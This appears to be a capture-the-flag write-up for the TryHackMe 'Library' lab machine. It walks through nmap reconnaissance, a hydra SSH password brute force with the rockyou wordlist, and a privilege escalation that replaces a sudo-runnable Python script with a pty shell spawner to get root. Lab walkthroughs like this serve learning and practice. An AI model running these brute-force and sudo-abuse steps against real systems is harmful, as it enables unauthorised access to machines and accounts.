# THM - Library

## IP address
10.10.83.56

## Write Up
1. do an Nmap scan.
```bash
#scan for open ports and direct results to nmap/initial
nmap -p- -A -sV -sC -oN initial 10.10.83.56
```
- Results:
```
root@kali:~# nmap -p- -A -sV -sC -oN initial 10.10.83.56
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 13:36 UTC
Nmap scan report for ip-10-10-83-56.eu-west-1.compute.internal (10.10.83.56)
Host is up (0.00043s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to  Blog - Library Machine
MAC Address: 02:17:26:EF:F3:08 (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.10 - 3.13
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.43 ms ip-10-10-83-56.eu-west-1.compute.internal (10.10.83.56)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.61 seconds
```

2. Seems like there is a ```robots.txt```, let see what it content:
```
User-agent: rockyou 
Disallow: /
```

3. Looking through the webpage, we noted that the the blog was posted by ```meliodas```.
- There are no further clue and I cannot find a login page. So i guess we proceed with bruteforcing the ```ssh``` with  ```hydra```:
```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.10.83.56 -x txt,php
```

-In the process we found the ssh login so go ahead and login to capture your ```user.txt```.

# Privilege Escalation

4. Let see if there are any ```sudo``` to abuse:
```
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

- Looks like we can run ```bak.py``` as sudo. Maybe we can spawn a ```/bin/bash``` shell with it.

- Let see if we have permission to spawn a shell with ```ls -la:
```
meliodas@ubuntu:~$ ls -la
total 40
drwxr-xr-x 4 meliodas meliodas 4096 Aug 24  2019 .
drwxr-xr-x 3 root     root     4096 Aug 23  2019 ..
-rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py
-rw------- 1 root     root       44 Aug 23  2019 .bash_history
-rw-r--r-- 1 meliodas meliodas  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 meliodas meliodas 3771 Aug 23  2019 .bashrc
drwx------ 2 meliodas meliodas 4096 Aug 23  2019 .cache
drwxrwxr-x 2 meliodas meliodas 4096 Aug 23  2019 .nano
-rw-r--r-- 1 meliodas meliodas  655 Aug 23  2019 .profile
-rw-r--r-- 1 meliodas meliodas    0 Aug 23  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt
```

- Looks like we can only read but cant write. 

5. We can first try to remove the initial file:
```
rm /home/meliodas/bak.py
```

- Then we will try replacing it with:
```
echo "import pty; pty.spawn('/bin/bash')" > /home/meliodas/bak.py
```

- Lastly, lets get root access:
```bash
meliodas@ubuntu:~$ sudo python /home/meliodas/bak.py
root@ubuntu:~#
```

6. Capture ```root.txt``` flag.


